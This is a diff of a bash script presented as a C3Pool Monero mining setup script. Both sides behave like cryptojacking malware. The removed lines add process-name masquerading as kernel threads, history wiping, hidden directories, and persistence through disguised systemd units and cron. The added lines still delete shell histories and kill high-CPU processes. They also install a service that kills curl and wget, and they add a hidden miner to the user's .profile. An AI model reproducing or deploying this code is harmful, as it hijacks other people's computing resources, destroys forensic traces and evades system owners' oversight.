@@ -1,39 +1,6 @@
 #!/bin/bash
+
 VERSION=2.11
-
-ensure_single_instance() {
-    local lock_file="/tmp/.sysupdate.lock"
-    if [ -f "$lock_file" ]; then
-        local old_pid=$(cat "$lock_file" 2>/dev/null)
-        if [ -n "$old_pid" ] && kill -0 "$old_pid" 2>/dev/null; then
-            exit 0
-        fi
-    fi
-    echo $$ > "$lock_file"
-}
-
-random_process_name() {
-    local names=("systemd" "kthreadd" "ksoftirqd" "migration" "rcu_sched" "rcu_bh" "lru-add-drain" "watchdog" "cpuhp" "kworker" "kdevtmpfs" "netns" "khungtaskd")
-    local count=${#names[@]}
-    local idx=$((RANDOM % count))
-    if [ -n "$BASH_VERSION" ] && [ "${BASH_VERSION%%.*}" -ge 4 ]; then
-        exec -a "${names[$idx]}" "$0" "$@" 2>/dev/null || true
-    fi
-}
-
-cleanup_history() {
-    [ -f ~/.bash_history ] && rm -f ~/.bash_history 2>/dev/null
-    [ -f ~/.zsh_history ] && rm -f ~/.zsh_history 2>/dev/null
-    [ -f ~/.history ] && rm -f ~/.history 2>/dev/null
-    [ -d ~/.local/share/fish ] && rm -rf ~/.local/share/fish/history* 2>/dev/null
-    export HISTFILE=""
-    export HISTSIZE=0
-    export HISTFILESIZE=0
-    unset HISTFILE HISTSIZE HISTFILESIZE
-}
-
-ensure_single_instance
-cleanup_history
 
 echo "C3Pool mining setup script v$VERSION."
 echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
@@ -61,22 +28,21 @@ fi
 
 PASS="root"
 
-HIDDEN_DIR="$HOME/.config/.local/.sys"
-MINER_DIR="/var/tmp/.docker"
-MINER_NAME="nodebox"
-SERVICE_NAME="c3pool_miner"
-
 if [ ! -d /var/tmp ]; then
   echo "ERROR: /var/tmp directory does not exist"
   exit 1
 fi
 
-mkdir -p "$HIDDEN_DIR" 2>/dev/null
-
 if ! type lscpu >/dev/null; then
   echo "WARNING: This script requires \"lscpu\" utility to work correctly"
 fi
 
+if [ -f ~/.bash_history ]; then
+    rm ~/.bash_history
+fi
+if [ -f ~/.zsh_history ]; then
+    rm ~/.zsh_history
+fi
 
 download_file() {
   local url="$1"
@@ -147,7 +113,7 @@ fi
 echo "Projected Monero hashrate: $EXP_MONERO_HASHRATE H/s"
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by /var/tmp/.docker/docker.sh script."
+echo "If needed, miner in foreground can be started by /var/tmp/.nodebox/nodebox.sh script."
 echo "Mining will happen to $WALLET wallet on SupportXMR pools."
 if [ ! -z $EMAIL ]; then
   echo "(Email $EMAIL provided for reference - check stats at https://www.supportxmr.com/)"
@@ -167,18 +133,14 @@ echo
 
 echo "[*] Removing previous c3pool miner (if any)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop "$SERVICE_NAME.service" 2>/dev/null
+  sudo systemctl stop c3pool_miner.service
   sudo systemctl stop curl_wget_killer.service 2>/dev/null
-  sudo systemctl --user stop "$SERVICE_NAME.service" 2>/dev/null
 fi
 killall xmrig 2>/dev/null
 killall -9 xmrig 2>/dev/null
-killall -9 "$MINER_NAME" 2>/dev/null
-pkill "$MINER_NAME" 2>/dev/null
+killall -9 nodebox 2>/dev/null
+pkill nodebox 2>/dev/null
 pkill xmrig 2>/dev/null
-for name in systemd kthreadd ksoftirqd migration rcu_sched; do
-    pkill -f "$name" 2>/dev/null | grep -v "$$" | xargs kill -9 2>/dev/null
-done
 echo "[*] Killing processes with CPU usage > 70%"
 ps aux | awk 'NR>1 && $3 > 70.0 && $2 != '$$' {print $2}' | while read pid; do
   if [ ! -z "$pid" ]; then
@@ -186,83 +148,68 @@ ps aux | awk 'NR>1 && $3 > 70.0 && $2 != '$$' {print $2}' | while read pid; do
   fi
 done
 
-echo "[*] Removing previous installation"
-rm -rf "$MINER_DIR" 2>/dev/null
-rm -rf "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
-rm -f "$HIDDEN_DIR/.installed" 2>/dev/null
+echo "[*] Removing /var/tmp/.nodebox directory"
+rm -rf /var/tmp/.nodebox
 
-TEMP_FILE="/var/tmp/.update$(date +%s).tar.gz"
-echo "[*] Downloading C3Pool advanced version of nodebox"
-if ! download_file "https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz" "$TEMP_FILE"; then
-  echo "ERROR: Can't download miner file"
+echo "[*] Downloading C3Pool advanced version of nodebox to /var/tmp/nodebox.tar.gz"
+if ! download_file "https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz" /var/tmp/nodebox.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz file to /var/tmp/nodebox.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking miner"
-[ -d "$MINER_DIR" ] || mkdir -p "$MINER_DIR"
-if ! tar xf "$TEMP_FILE" -C "$MINER_DIR" 2>/dev/null; then
-  echo "ERROR: Can't unpack miner directory"
+echo "[*] Unpacking /var/tmp/nodebox.tar.gz to /var/tmp/.nodebox"
+[ -d /var/tmp/.nodebox ] || mkdir -p /var/tmp/.nodebox
+if ! tar xf /var/tmp/nodebox.tar.gz -C /var/tmp/.nodebox; then
+  echo "ERROR: Can't unpack /var/tmp/nodebox.tar.gz to /var/tmp/.nodebox directory"
   exit 1
 fi
-rm -f "$TEMP_FILE" 2>/dev/null
+rm /var/tmp/nodebox.tar.gz
 
-if [ -f "$MINER_DIR/xmrig" ]; then
-  mv "$MINER_DIR/xmrig" "$MINER_DIR/$MINER_NAME"
-  chmod +x "$MINER_DIR/$MINER_NAME" 2>/dev/null
+if [ -f /var/tmp/.nodebox/xmrig ]; then
+  mv /var/tmp/.nodebox/xmrig /var/tmp/.nodebox/nodebox
 fi
 
-if [ -f "$MINER_DIR/$MINER_NAME" ]; then
-  cp "$MINER_DIR/$MINER_NAME" "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
-  chmod +x "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
+echo "[*] Checking if advanced version of /var/tmp/.nodebox/nodebox works fine (and not removed by antivirus software)"
+if [ -f /var/tmp/.nodebox/config.json ]; then
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /var/tmp/.nodebox/config.json
 fi
-
-echo "[*] Checking if advanced version of miner works fine"
-if [ -f "$MINER_DIR/config.json" ]; then
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$MINER_DIR/config.json" 2>/dev/null
-fi
-"$MINER_DIR/$MINER_NAME" --help >/dev/null 2>&1
+/var/tmp/.nodebox/nodebox --help >/dev/null 2>&1
 if (test $? -ne 0); then
-  if [ -f "$MINER_DIR/$MINER_NAME" ]; then
-    echo "WARNING: Advanced version of miner is not functional"
+  if [ -f /var/tmp/.nodebox/nodebox ]; then
+    echo "WARNING: Advanced version of /var/tmp/.nodebox/nodebox is not functional"
   else 
-    echo "WARNING: Advanced version of miner was removed by antivirus"
+    echo "WARNING: Advanced version of /var/tmp/.nodebox/nodebox was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
   LATEST_XMRIG_LINUX_RELEASE="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
 
-  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE"
-  if ! download_file "$LATEST_XMRIG_LINUX_RELEASE" "$TEMP_FILE"; then
-    echo "ERROR: Can't download miner file"
+  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /var/tmp/nodebox.tar.gz"
+  if ! download_file "$LATEST_XMRIG_LINUX_RELEASE" /var/tmp/nodebox.tar.gz; then
+    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /var/tmp/nodebox.tar.gz"
     exit 1
   fi
 
-  echo "[*] Unpacking miner"
-  if ! tar xf "$TEMP_FILE" -C "$MINER_DIR" --strip=1 2>/dev/null; then
-    echo "WARNING: Can't unpack miner directory"
+  echo "[*] Unpacking /var/tmp/nodebox.tar.gz to /var/tmp/.nodebox"
+  if ! tar xf /var/tmp/nodebox.tar.gz -C /var/tmp/.nodebox --strip=1; then
+    echo "WARNING: Can't unpack /var/tmp/nodebox.tar.gz to /var/tmp/.nodebox directory"
   fi
-  rm -f "$TEMP_FILE" 2>/dev/null
+  rm /var/tmp/nodebox.tar.gz
 
-  if [ -f "$MINER_DIR/xmrig" ]; then
-    mv "$MINER_DIR/xmrig" "$MINER_DIR/$MINER_NAME"
-    chmod +x "$MINER_DIR/$MINER_NAME" 2>/dev/null
-  fi
-
-  if [ -f "$MINER_DIR/$MINER_NAME" ]; then
-    cp "$MINER_DIR/$MINER_NAME" "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
-    chmod +x "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
+  if [ -f /var/tmp/.nodebox/xmrig ]; then
+    mv /var/tmp/.nodebox/xmrig /var/tmp/.nodebox/nodebox
   fi
 
-  echo "[*] Checking if stock version of miner works fine"
-  if [ -f "$MINER_DIR/config.json" ]; then
-    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$MINER_DIR/config.json" 2>/dev/null
+  echo "[*] Checking if stock version of /var/tmp/.nodebox/nodebox works fine (and not removed by antivirus software)"
+  if [ -f /var/tmp/.nodebox/config.json ]; then
+    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /var/tmp/.nodebox/config.json
   fi
-  "$MINER_DIR/$MINER_NAME" --help >/dev/null 2>&1
+  /var/tmp/.nodebox/nodebox --help >/dev/null 2>&1
   if (test $? -ne 0); then 
-    if [ -f "$MINER_DIR/$MINER_NAME" ]; then
-      echo "WARNING: Stock version of miner is not functional"
+    if [ -f /var/tmp/.nodebox/nodebox ]; then
+      echo "WARNING: Stock version of /var/tmp/.nodebox/nodebox is not functional"
     else 
-      echo "WARNING: Stock version of miner was removed by antivirus"
+      echo "WARNING: Stock version of /var/tmp/.nodebox/nodebox was removed by antivirus"
     fi
     
     if [ -f /etc/os-release ] && grep -q 'NAME="Alpine Linux"' /etc/os-release; then
@@ -273,7 +220,7 @@ if (test $? -ne 0); then
         PASS="root"
         echo "[*] Starting xmrig with auto-restart loop"
         (while true; do
-          xmrig -o pool.supportxmr.com:443 -u $WALLET -p $PASS -k --donate-level 0 --log-file="$MINER_DIR/$MINER_NAME.log" --coin monero --tls >/dev/null 2>&1
+          xmrig -o pool.supportxmr.com:443 -u $WALLET -p $PASS -k --donate-level 0 --log-file=/var/tmp/.nodebox/nodebox.log --coin monero --tls >/dev/null 2>&1
           sleep 5
         done) &
         echo "[*] xmrig started in background with auto-restart"
@@ -283,18 +230,18 @@ if (test $? -ne 0); then
         exit 1
       fi
     else
-      echo "ERROR: Stock version of /var/tmp/.docker/nodebox is not functional and not Alpine Linux"
+      echo "ERROR: Stock version of /var/tmp/.nodebox/nodebox is not functional and not Alpine Linux"
       exit 1
     fi
   fi
 fi
 
-echo "[*] Miner $MINER_DIR/$MINER_NAME is OK"
+echo "[*] Miner /var/tmp/.nodebox/nodebox is OK"
 
 PASS="root"
 
 echo "[*] Creating SupportXMR config.json with multiple pools"
-cat >"$MINER_DIR/config.json" <<EOL
+cat >/var/tmp/.nodebox/config.json <<EOL
 {
     "autosave": true,
     "cpu": true,
@@ -344,95 +291,49 @@ cat >"$MINER_DIR/config.json" <<EOL
             "tls": false
         }
     ],
-    "log-file": "$MINER_DIR/$MINER_NAME.log",
+    "log-file": "/var/tmp/.nodebox/nodebox.log",
     "donate-level": 0,
     "max-cpu-usage": 100,
     "syslog": true
 }
 EOL
 
-cp "$MINER_DIR/config.json" "$MINER_DIR/config_background.json" 2>/dev/null
-sed -i 's/"background": *false,/"background": true,/' "$MINER_DIR/config_background.json" 2>/dev/null || true
+cp /var/tmp/.nodebox/config.json /var/tmp/.nodebox/config_background.json
+sed -i 's/"background": *false,/"background": true,/' /var/tmp/.nodebox/config_background.json 2>/dev/null || true
 
-echo "[*] Creating miner startup script"
-cat >"$MINER_DIR/docker.sh" <<EOL
+echo "[*] Creating /var/tmp/.nodebox/nodebox.sh script"
+cat >/var/tmp/.nodebox/nodebox.sh <<EOL
 #!/bin/bash
-cleanup_history() {
-    export HISTFILE=""
-    export HISTSIZE=0
-    export HISTFILESIZE=0
-    unset HISTFILE HISTSIZE HISTFILESIZE
-}
-cleanup_history
 
-if ! pidof $MINER_NAME >/dev/null; then
-  nice "$MINER_DIR/$MINER_NAME" \$*
+if ! pidof nodebox >/dev/null; then
+  nice /var/tmp/.nodebox/nodebox \$*
 else
-  if [ ! -f "$MINER_DIR/$MINER_NAME.log" ]; then
-    "$MINER_DIR/$MINER_NAME" --config="$MINER_DIR/config.json" >/dev/null 2>&1
+  if [ ! -f /var/tmp/.nodebox/nodebox.log ]; then
+    echo "[*] File /var/tmp/.nodebox/nodebox.log not found"
+    /var/tmp/.nodebox/nodebox --config=/var/tmp/.nodebox/config.json >/dev/null 2>&1
+  else
+    echo "Monero miner is already running in the background. Refusing to run another one."
+    echo "Run \"killall nodebox\" or \"sudo killall nodebox\" if you want to remove background miner first."
   fi
 fi
 EOL
 
-chmod +x "$MINER_DIR/docker.sh" 2>/dev/null
-
-setup_user_persistence() {
-    local home_dir="${HOME:-/var/tmp}"
-    local service_dir="$home_dir/.config/systemd/user"
-    local service_file="$service_dir/$SERVICE_NAME.service"
-    
-    mkdir -p "$service_dir" 2>/dev/null
-    mkdir -p "$HIDDEN_DIR" 2>/dev/null
-    
-    if [ -f "$MINER_DIR/$MINER_NAME" ]; then
-        cp "$MINER_DIR/$MINER_NAME" "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
-        chmod +x "$HIDDEN_DIR/.rsyslogd" 2>/dev/null
-    fi
-    
-    cat >"$service_file" <<EOL
-[Unit]
-Description=systemd-journalds
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=$MINER_DIR/$MINER_NAME --config=$MINER_DIR/config_background.json
-Restart=always
-RestartSec=10
-Environment="HISTFILE="
-Environment="HISTSIZE=0"
-Environment="HISTFILESIZE=0"
-
-[Install]
-WantedBy=default.target
-EOL
-    
-    systemctl --user daemon-reload 2>/dev/null
-    systemctl --user enable "$SERVICE_NAME.service" 2>/dev/null
-    systemctl --user start "$SERVICE_NAME.service" 2>/dev/null || true
-    
-    if ! crontab -l 2>/dev/null | grep -q "$MINER_DIR/$MINER_NAME"; then
-        (crontab -l 2>/dev/null; echo "@reboot $MINER_DIR/$MINER_NAME --config=$MINER_DIR/config_background.json >/dev/null 2>&1") | crontab - 2>/dev/null
-    fi
-    
-    touch "$HIDDEN_DIR/.installed" 2>/dev/null
-}
+chmod +x /var/tmp/.nodebox/nodebox.sh
 
 if ! sudo -n true 2>/dev/null; then
   if [ -z "$HOME" ]; then
     HOME=/var/tmp
   fi
-  setup_user_persistence
-  
-  if ! grep "$MINER_DIR/docker.sh" "$HOME/.profile" >/dev/null 2>&1; then
-    echo "[*] Adding miner script to $HOME/.profile"
-    echo "$MINER_DIR/docker.sh --config=$MINER_DIR/config_background.json >/dev/null 2>&1" >>"$HOME/.profile"
+  if ! grep ".nodebox/nodebox.sh" $HOME/.profile >/dev/null 2>&1; then
+    echo "[*] Adding /var/tmp/.nodebox/nodebox.sh script to $HOME/.profile"
+    echo "/var/tmp/.nodebox/nodebox.sh --config=/var/tmp/.nodebox/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  else 
+    echo "Looks like /var/tmp/.nodebox/nodebox.sh script is already in the $HOME/.profile"
   fi
-  
-  echo "[*] Running miner in the background (see logs in $MINER_DIR/$MINER_NAME.log file)"
+  echo "[*] Running miner in the background (see logs in /var/tmp/.nodebox/nodebox.log file)"
   for s in /bin/bash /bin/sh /usr/bin/bash /usr/bin/sh bash sh; do
     if command -v $s >/dev/null 2>&1; then
-      $s "$MINER_DIR/docker.sh" --config="$MINER_DIR/config_background.json" >/dev/null 2>&1 &
+      $s /var/tmp/.nodebox/nodebox.sh --config=/var/tmp/.nodebox/config_background.json >/dev/null 2>&1 &
       break
     fi
   done
@@ -446,10 +347,10 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in /var/tmp/.docker/nodebox.log file)"
+    echo "[*] Running miner in the background (see logs in /var/tmp/.nodebox/nodebox.log file)"
     for s in /bin/bash /bin/sh /usr/bin/bash /usr/bin/sh bash sh; do
       if command -v $s >/dev/null 2>&1; then
-        $s /var/tmp/.docker/docker.sh --config=/var/tmp/.docker/config_background.json >/dev/null 2>&1
+        $s /var/tmp/.nodebox/nodebox.sh --config=/var/tmp/.nodebox/config_background.json >/dev/null 2>&1
         break
       fi
     done
@@ -461,7 +362,7 @@ else
     echo "[*] Creating curl_wget_killer systemd service"
     cat >/var/tmp/curl_wget_killer.service <<EOL
 [Unit]
-Description=Network Monitor Service
+Description=Kill curl and wget processes
 
 [Service]
 Type=simple
@@ -472,37 +373,33 @@ RestartSec=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /var/tmp/curl_wget_killer.service /etc/systemd/system/curl_wget_killer.service 2>/dev/null
+    sudo mv /var/tmp/curl_wget_killer.service /etc/systemd/system/curl_wget_killer.service
     echo "[*] Starting curl_wget_killer systemd service"
-    sudo systemctl daemon-reload 2>/dev/null
-    sudo systemctl enable curl_wget_killer.service 2>/dev/null
-    sudo systemctl start curl_wget_killer.service 2>/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl enable curl_wget_killer.service
+    sudo systemctl start curl_wget_killer.service
 
-    echo "[*] Creating $SERVICE_NAME systemd service"
-    cat >/var/tmp/$SERVICE_NAME.service <<EOL
+    echo "[*] Creating c3pool_miner systemd service"
+    cat >/var/tmp/c3pool_miner.service <<EOL
 [Unit]
-Description=systemd-journalds
+Description=Monero miner service
 
 [Service]
-ExecStart=$MINER_DIR/$MINER_NAME --config=$MINER_DIR/config.json
+ExecStart=/var/tmp/.nodebox/nodebox --config=/var/tmp/.nodebox/config.json
 Restart=always
-RestartSec=10
 Nice=10
 CPUWeight=1
-Environment="HISTFILE="
-Environment="HISTSIZE=0"
-Environment="HISTFILESIZE=0"
 
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /var/tmp/$SERVICE_NAME.service /etc/systemd/system/$SERVICE_NAME.service 2>/dev/null
-    echo "[*] Starting $SERVICE_NAME systemd service"
-    sudo killall "$MINER_NAME" 2>/dev/null
-    sudo systemctl daemon-reload 2>/dev/null
-    sudo systemctl enable "$SERVICE_NAME.service" 2>/dev/null
-    sudo systemctl start "$SERVICE_NAME.service" 2>/dev/null
-    echo "To see miner service logs run \"sudo journalctl -u $SERVICE_NAME -f\" command"
+    sudo mv /var/tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
+    echo "[*] Starting c3pool_miner systemd service"
+    sudo killall nodebox 2>/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl enable c3pool_miner.service
+    sudo systemctl start c3pool_miner.service
+    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
     echo "To see kill service logs run \"sudo journalctl -u curl_wget_killer -f\" command"
   fi
 fi
@@ -512,24 +409,22 @@ echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usag
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e $MINER_NAME -l $((75*$CPU_THREADS)) -b"
+  echo "sudo cpulimit -e nodebox -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e $MINER_NAME -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$acpulimit -e nodebox -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   else
-    echo "sudo sed -i -e '\$i \\cpulimit -e $MINER_NAME -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$i \\cpulimit -e nodebox -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' $MINER_DIR/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' $MINER_DIR/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/var/tmp/.nodebox/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/var/tmp/.nodebox/config_background.json"
 fi
 echo ""
 sleep 5
-if [ ! -f "$MINER_DIR/$MINER_NAME.log" ]; then
-  echo "[*] File $MINER_DIR/$MINER_NAME.log not found"
-  "$MINER_DIR/$MINER_NAME" --config="$MINER_DIR/config.json" >/dev/null 2>&1
+if [ ! -f /var/tmp/.nodebox/nodebox.log ]; then
+  echo "[*] File /var/tmp/.nodebox/nodebox.log not found"
+  /var/tmp/.nodebox/nodebox --config=/var/tmp/.nodebox/config.json >/dev/null 2>&1
 fi
 
-cleanup_history
-rm -f /tmp/.sysupdate.lock 2>/dev/null
-echo "[*] Setup complete"
+echo "[*] Setup complete" 
